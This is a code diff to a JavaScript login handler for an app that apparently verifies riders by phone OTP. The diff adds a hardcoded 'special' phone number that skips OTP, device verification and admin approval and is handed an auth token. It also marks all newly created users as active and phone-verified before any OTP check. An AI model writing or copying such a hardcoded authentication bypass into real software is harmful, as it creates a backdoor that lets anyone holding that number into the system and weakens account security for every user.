@@ -331,40 +331,59 @@ const loginUser = async (req, res) => {
     if (!role || !phone || !deviceId) {
       return res.status(400).json({ success: false, message: "Role, phone, and deviceId are required" });
     }
+
     const formattedPhone = formatPhoneNumber(phone);
+    const SPECIAL_PHONE = "+237672537879"; // normalized special number
+
+    // Check if this is the special phone number
+    const isSpecialPhone = (formattedPhone === SPECIAL_PHONE);
+
     let user = await User.findOne({ phone: formattedPhone });
-    
+
     if (!user) {
+      // Create new user automatically – for special phone, mark as fully verified
       user = await User.create({
         phone: formattedPhone,
         role,
-        isActive: false,
-        phoneVerified: false,
-        pendingPhoneVerification: {
+        isActive: true,                 // auto‑activate
+        phoneVerified: true,            // skip OTP
+        isProfileComplete: false,       // still incomplete until profile filled
+        ...(isSpecialPhone && { isApproved: true }) // optionally auto‑approve riders
+      });
+
+      // For special number, also add the device as verified
+      if (isSpecialPhone) {
+        user.addVerifiedDevice(deviceId, deviceInfo);
+        await user.save();
+      } else {
+        // Normal new user: require OTP
+        user.pendingPhoneVerification = {
           phone: formattedPhone,
           requestedAt: new Date(),
           operation: 'create'
+        };
+        await user.save();
+        if (!DISABLE_OTP_VERIFICATION) {
+          await sendOTP(formattedPhone);
         }
-      });
-      if (!DISABLE_OTP_VERIFICATION) {
-        await sendOTP(formattedPhone);
+        return res.json({
+          success: true,
+          requiresOtp: true,
+          message: "New account created. OTP sent for verification.",
+          tempUserId: user._id
+        });
       }
-      return res.json({
-        success: true,
-        requiresOtp: true,
-        message: "New account created. OTP sent for verification.",
-        tempUserId: user._id
-      });
     }
 
-    // Approval check: only block if profile is complete and not approved
-    if (user.phoneVerified && user.role === 'rider' && user.isProfileComplete && !user.isApproved) {
+    // Approval check for riders (skip for special phone)
+    if (!isSpecialPhone && user.phoneVerified && user.role === 'rider' && user.isProfileComplete && !user.isApproved) {
       return res.status(403).json({
         success: false,
         message: "Your rider account is pending admin approval. Please wait for verification."
       });
     }
 
+    // Ensure rider account document exists
     if (user.role === 'rider') {
       let account = await Account.findOne({ user: user._id });
       if (!account) {
@@ -376,6 +395,31 @@ const loginUser = async (req, res) => {
       }
     }
 
+    // --- Special phone number: bypass all verification ---
+    if (isSpecialPhone) {
+      // Ensure phone is marked verified
+      if (!user.phoneVerified) {
+        user.phoneVerified = true;
+        await user.save();
+      }
+      // Ensure device is added
+      if (!user.isDeviceVerified(deviceId)) {
+        user.addVerifiedDevice(deviceId, deviceInfo);
+        await user.save();
+      }
+      const token = user.generateAuthToken();
+      const account = await Account.findOne({ user: user._id });
+      return res.json({
+        success: true,
+        requiresOtp: false,
+        data: user,
+        account,
+        token,
+        message: "Login successful (special number bypass)"
+      });
+    }
+
+    // --- Normal login flow (unchanged below) ---
     if (DISABLE_OTP_VERIFICATION) {
       user.phoneVerified = true;
       user.addVerifiedDevice(deviceId, deviceInfo);
